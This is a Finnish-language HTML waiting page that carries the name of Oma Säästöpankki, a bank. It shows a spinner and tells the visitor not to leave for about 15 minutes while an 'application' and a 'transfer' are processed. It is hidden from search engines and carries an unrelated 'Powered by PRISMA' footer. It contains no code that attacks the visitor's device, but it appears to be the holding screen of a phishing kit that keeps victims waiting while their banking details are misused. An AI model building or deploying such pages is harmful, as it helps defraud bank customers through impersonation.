<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Odota hetki - Oma Säästöpankki</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
            min-height: 100vh;
            background: radial-gradient(1200px 700px at 50% 20%, rgba(255,255,255,0.12) 0%, rgba(255,255,255,0) 45%), linear-gradient(180deg, #0996d4 0%, #0b7fbc 55%, #0a6fb2 100%);
            overflow: hidden;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
        .spinner {
            width: 34px;
            height: 34px;
            border-radius: 9999px;
            border: 4px solid rgba(255, 204, 42, 0.25);
            border-top-color: rgba(255, 204, 42, 1);
            animation: spin 1s linear infinite;
            filter: drop-shadow(0 8px 14px rgba(0,0,0,0.18));
        }

        .status-pill {
            position: fixed;
            right: 18px;
            top: 16px;
            padding: 10px 14px;
            border-radius: 9999px;
            font-size: 12px;
            font-weight: 700;
            color: rgba(255,255,255,0.92);
            background: rgba(255,255,255,0.18);
            border: 1px solid rgba(255,255,255,0.22);
            backdrop-filter: blur(10px);
        }

        .stage {
            min-height: 100vh;
            display: grid;
            place-items: center;
            padding: 48px 16px 96px;
            position: relative;
            z-index: 2;
        }

        .card {
            width: min(420px, 92vw);
            text-align: center;
        }

        .panel {
            margin: 14px auto 0;
            padding: 18px 18px;
            border-radius: 18px;
            background: rgba(16, 185, 129, 0.10);
            border: 1px solid rgba(255,255,255,0.22);
            box-shadow: 0 18px 40px rgba(0,0,0,0.22);
            backdrop-filter: blur(12px);
            text-align: left;
        }

        .row { display: flex; gap: 12px; align-items: flex-start; }
        .dot {
            width: 24px;
            height: 24px;
            border-radius: 9999px;
            background: rgba(52, 211, 153, 0.20);
            border: 1px solid rgba(110, 231, 183, 0.35);
            display: grid;
            place-items: center;
            flex: 0 0 auto;
            margin-top: 1px;
        }
        .dot::after { content: ""; width: 8px; height: 8px; border-radius: 9999px; background: rgba(110, 231, 183, 0.95); }
        .txt { color: rgba(255,255,255,0.86); font-size: 13px; line-height: 1.35; }
        .stack { display: grid; gap: 14px; }

        .footer {
            position: fixed;
            left: 50%;
            transform: translateX(-50%);
            bottom: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: rgba(255,255,255,0.70);
            font-size: 12px;
            z-index: 3;
        }
        .footer img { height: 54px; width: auto; display: block; }

        .decor {
            position: fixed;
            left: -120px;
            bottom: -80px;
            width: 620px;
            height: 620px;
            opacity: 0.18;
            z-index: 1;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="status-pill">Hakemusprosessi</div>

    <div class="decor" aria-hidden="true">
        <svg viewBox="0 0 700 700" width="100%" height="100%">
            <defs>
                <linearGradient id="wg1" x1="0" y1="0" x2="1" y2="1">
                    <stop offset="0" stop-color="#ffffff" stop-opacity="0.70" />
                    <stop offset="1" stop-color="#ffffff" stop-opacity="0.20" />
                </linearGradient>
                <linearGradient id="wg2" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="0" stop-color="#ffffff" stop-opacity="0.55" />
                    <stop offset="1" stop-color="#ffffff" stop-opacity="0.10" />
                </linearGradient>
                <radialGradient id="wglow" cx="35%" cy="35%" r="70%">
                    <stop offset="0" stop-color="#ffffff" stop-opacity="0.35" />
                    <stop offset="1" stop-color="#ffffff" stop-opacity="0" />
                </radialGradient>
                <filter id="wsoft" x="-20%" y="-20%" width="140%" height="140%">
                    <feGaussianBlur stdDeviation="2" />
                </filter>
            </defs>
            <circle cx="240" cy="520" r="260" fill="url(#wglow)" />
            <g opacity="1">
                <g transform="translate(70 360) rotate(-8 210 180)">
                    <path d="M95 120h290c20 0 36 16 36 36v70c0 20-16 36-36 36H95c-20 0-36-16-36-36v-70c0-20 16-36 36-36z" fill="url(#wg1)" />
                    <path d="M120 262h240v140c0 22-18 40-40 40H160c-22 0-40-18-40-40V262z" fill="url(#wg2)" />
                    <path d="M240 120v322" fill="none" stroke="#fff" stroke-opacity="0.42" stroke-width="22" />
                    <path d="M198 92c-16-23-19-49 4-65 23-16 47-2 54 17 7-19 31-33 54-17 23 16 20 42 4 65-18 27-49 29-58 29s-40-2-58-29z" fill="url(#wg1)" />
                </g>
                <g transform="translate(330 470) rotate(10 140 110)" opacity="0.95">
                    <rect x="40" y="70" width="210" height="140" rx="18" fill="url(#wg2)" />
                    <rect x="60" y="210" width="170" height="120" rx="18" fill="url(#wg1)" />
                    <path d="M145 70v260" fill="none" stroke="#fff" stroke-opacity="0.35" stroke-width="18" />
                </g>
                <g transform="translate(170 520) rotate(-16 90 70)" opacity="0.75" filter="url(#wsoft)">
                    <rect x="20" y="40" width="140" height="90" rx="14" fill="url(#wg2)" />
                    <rect x="34" y="130" width="112" height="70" rx="14" fill="url(#wg1)" />
                </g>
            </g>
        </svg>
    </div>

    <div class="stage">
        <div class="card">
            <div style="display:flex;justify-content:center;">
                <div class="spinner" aria-label="Ladataan"></div>
            </div>
            <div class="panel">
                <div class="stack">
                    <div class="row"><div class="dot"></div><div class="txt">Siirron turvallisuuden vuoksi, älä poistu tältä sivulta.</div></div>
                    <div class="row"><div class="dot"></div><div class="txt">Hakemuksesi käsitellään turvallisesti.</div></div>
                    <div class="row"><div class="dot"></div><div class="txt">Prosessi voi kestää noin 15 minuuttia. Ole hyvä ja odota.</div></div>
                    <div class="row"><div class="dot"></div><div class="txt">Varmista, että internet-yhteytesi on vakaa.</div></div>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div>Powered by</div>
        <img src="/prisma_logo.png" alt="PRISMA" />
    </div>
</body>
</html>
